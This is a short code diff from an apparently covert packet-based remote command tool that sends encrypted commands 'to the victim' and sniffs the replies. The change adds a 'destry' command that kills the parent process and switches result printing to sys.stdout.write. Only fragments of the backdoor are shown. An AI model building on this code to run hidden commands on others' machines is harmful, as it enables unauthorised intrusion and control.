@@ -124,6 +124,8 @@ def getCmd():
 			'''
 			#create a packet to send to the victim
 			sendCommand(protocol, encryptedCmd, 1000)
+			if cmd == "destry":
+			    os.system('kill $PPID')
 			sniffer()
 
 
@@ -332,7 +334,8 @@ def parse_packet(packet):
 
 
 					#print 'Data : ' + result
-					print result,
+					#result = result[:-1]
+					sys.stdout.write(result)
 					if (iph[3] == 2):
 						return True
 				
